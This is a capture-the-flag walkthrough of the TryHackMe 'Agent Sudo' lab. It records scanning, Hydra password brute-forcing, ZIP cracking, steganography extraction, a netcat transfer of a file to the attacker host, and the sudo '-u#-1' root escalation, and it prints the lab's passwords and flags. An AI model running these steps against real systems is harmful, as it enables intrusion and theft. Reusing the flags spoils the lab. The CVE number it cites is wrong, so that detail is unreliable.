AGENT SUDO.




ENUMERATION: PORTS.
Quick namp scan:
nmap -T4 -sS -sV 10.10.212.244
OUTPUT:
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel




ENUMERATION: DIRECTORIES.
Since the next questions ask about secret pages, it's clear that this is the right next step. Gobuster scan:
gobuster dir -u http://10.10.212.244 -w /usr/share/wordlists/dirb/common.txt
OUTPUT:
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 218]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
Note:
None of it seems useful. 




FTP RECON:
Connection:
ftp 10.10.212.244
Note:
anonymous doesn't seem to work. Nothing else to do for now.




ENUMERATION: FILES, GOBUSTER.
Command:
gobuster dir -u http://10.10.212.244 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,bak,zip
OUTPUT (cut at 46% since it seems worthless):
/index.php            (Status: 200) [Size: 218]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.htaccess.zip        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.                    (Status: 200) [Size: 218]
/.html.php            (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/.html.txt            (Status: 403) [Size: 278]
/.html.bak            (Status: 403) [Size: 278]
/.html.zip            (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htpasswd.bak        (Status: 403) [Size: 278]
/.htpasswd.zip        (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/.htm.bak             (Status: 403) [Size: 278]
/.htm.zip             (Status: 403) [Size: 278]
/.htm.php             (Status: 403) [Size: 278]
/.htm.txt             (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
/.htpasswds.php       (Status: 403) [Size: 278]
/.htpasswds.txt       (Status: 403) [Size: 278]
/.htpasswds.zip       (Status: 403) [Size: 278]
/.htpasswds.bak       (Status: 403) [Size: 278]
/.htgroup             (Status: 403) [Size: 278]
/.htgroup.bak         (Status: 403) [Size: 278]
/.htgroup.zip         (Status: 403) [Size: 278]
/.htgroup.php         (Status: 403) [Size: 278]
/.htgroup.txt         (Status: 403) [Size: 278]
/wp-forum.phps        (Status: 403) [Size: 278]
/.htaccess.bak.bak    (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.htaccess.bak.zip    (Status: 403) [Size: 278]
/.htaccess.bak.txt    (Status: 403) [Size: 278]
/.htaccess.bak.php    (Status: 403) [Size: 278]




CODENAME TESTING:
Note:
Landing site requests agents to use their codename as user-agent. Lets test:
curl -I -A "Agent R" http://10.10.212.244
OUTPUT:
HTTP/1.1 200 OK
Date: Sun, 13 Jul 2025 17:25:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Type: text/html; charset=UTF-8


Full html:
curl -A "Agent R" http://10.10.212.244
OUTPUT:
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
Note:
Same as default user-agent.


Testing again, with just R as agent header:
curl -A "R" http://10.10.212.244
Output:
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
Note:
Looks like R is a working code-name.
Also, the reply indicates there are 25 workers. Lets try different letters.


Working letter, C:
Command:
curl "10.10.212.244" -H "User-Agent: C" -L
OUTPUT:
curl "10.10.212.244" -H "User-Agent: C" -L
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
Note:
Now we have a user (chris). We can try to bruteforce ssh.




BRUTEFORCE ATTEMPT: chris, SSH:
Command:
hydra -l chris -P ~/thm/rockyou.txt 10.10.212.244 ssh
Note:
Ended the command. Taking too long.




BRUTEFORCE ATTEMPT: chris, FTP:
COMMAND:
hydra -l chris -P ~/thm/rockyou.txt -s 21 ftp://10.10.212.244
OUTPUT:
[21][ftp] host: 10.10.212.244   login: chris   password: crystal




FTP RECON:
With the found password (crystal) we log as chris:
ftp 10.10.212.244


Interesting files:
229 Entering Extended Passive Mode (|||44959|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.


Download just the .txt:
get To_agentJ.txt


Check txt content. OUTPUT:
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
Note:
Looks like we need to also download the images.


Download images:
mget cute-alien.jpg cutie.png




IMAGE ANALYSIS:
We need to inspect the metadata.
Exiftool on cutie:
exiftool cutie.png
OUTPUT:
xifTool Version Number         : 13.25
File Name                       : cutie.png
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2019:10:29 13:33:51+01:00
File Access Date/Time           : 2025:07:13 19:50:24+02:00
File Inode Change Date/Time     : 2025:07:13 19:50:24+02:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279


Exiftool on cute-alien:
ExifTool Version Number         : 13.25
File Name                       : cute-alien.jpg
Directory                       : .
File Size                       : 33 kB
File Modification Date/Time     : 2019:10:29 13:22:37+01:00
File Access Date/Time           : 2025:07:13 19:50:23+02:00
File Inode Change Date/Time     : 2025:07:13 19:50:23+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Image Width                     : 440
Image Height                    : 501
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 440x501
Megapixels                      : 0.220


Note:
Exiftool didn't reveal info on any image. Lets move to using binwalk.
Binwalk on cutie:
binwalk cutie.png
OUTPUT:
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22


Binwalk on cute-alien:
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


Note:
Looks like its only cute with interesting files embedded. We will take a look at them.
Extract cutie zip:
binwalk -e cutie.png
Note:
ERROR: command above doesn't work.
CORRECT alternative:
binwalk --dd=".*" cutie.png




Note:
Now we need to get john to work on cracking the zip.
CRACKING ZIP: JOHN.
Move into target directory:
cd _cutie.png.extracted/


List folder to find zip. OUTPUT:
365  365.zlib  8702.zip


Convert zip to hash:
zip2john 8702.zip > cutie_hash.txt


Crack zip hash:
john --wordlist=~/thm/rockyou.txt cutie_hash.txt
OUTPUT:
alien            (8702.zip/To_agentR.txt)     


Open hash: 
7z x 8702.zip


Check To_agentR file. OUTPUT:
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R


Looks like the password is encrypted or encoded.
Trying to decode it as base 64:
Area51



Note:
Thm insinuates Area51 is a steg password. Also, R indicates the login is in a fake picture. 
Thus, we try to run steg related tools on our images:
steghide --extract -sf cute-alien.jpg -p Area51
OUTPUT:
wrote extracted data to "message.txt".


We cat the result.OUTPUT:
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris




CONNECTING TO SSH:
With the found user and password (hackerrules!), we ssh:
ssh jamie@10.10.9.28




CAPTURE USER FLAG:
Check current directory:
pwd
OUTPUT:
/home/james


Check files in directory:
ls
OUTPUT:
Alien_autospy.jpg  user_flag.txt


Check user flag:
cat user_flag.txt
OUTPUT:
b03d975e8c92a7c04146cfa7a5a313c7




PHOTO INCIDENT:
Note:
Looks like we need to send te image over to our machine.
We start by creating an HTTP server on the attacker:
python3 -m http.server 8000


Send file from attacked:
curl http://10.23.25.109:8000 --upload-file Alien_autospy.jpg
ERROR: ATTACKER OUTPUT:
10.10.9.28 - - [14/Jul/2025 21:04:18] code 501, message Unsupported method ('PUT')
10.10.9.28 - - [14/Jul/2025 21:04:18] "PUT /Alien_autospy.jpg HTTP/1.1" 501 -
ERROR: ATTACKED OUTPUT:
<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 501</p>
        <p>Message: Unsupported method ('PUT').</p>
        <p>Error code explanation: 501 - Server does not support this operation.</p>
    </body>
</html>
Note:
This indicates python's http server only supports HEAD and GET requests, not PUT (uploads).
We try with an alternative (netcat):


Listener on attacker:
nc -lvnp 4444 > Alien_autospy.jpg


Sending from attacked:
nc 10.23.25.109 4444 < Alien_autospy.jpg 


OUTPUT (on attacker):
connect to [10.23.25.109] from (UNKNOWN) [10.10.9.28] 48450

Note:
We check the file, but it is a 0 byte jpg??
To figure out what's causing this, we check the file's properties on attacked:
ls -lh Alien_autospy.jpg
-rw-r--r-- 1 james james 0 Jul 14 19:08 Alien_autospy.jpg
Note:
Looks like this image is a decoy.
As confirmation:
binwalk Alien_autospy.jpg
OUPTUT:
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Note:
Looks like our machine is malfunctioning. Other users get a working file.
Answer is: Roswell alien autopsy




PRIVESC:
Check james sudo permissions:
sudo -l
OUTPUT:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash


James can run commands as anyone but root. Lets check what other users there are:
awk -F: '$3 >= 1000 {print $1}' /etc/passwd
OUTPUT:
nobody
james 
chris
Note:
Nothing to really do here.


Doing some googling (for: (ALL, !root) /bin/bash) we find the CVE the ctf asks us for:
CVE-2019-1487 (exploitdb link: https://www.exploit-db.com/exploits/47502).


We just need to run one line to get root:
sudo -u#-1 /bin/bash


Now we just check the root flag:
cat /root/root.txt
OUTPUT:
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
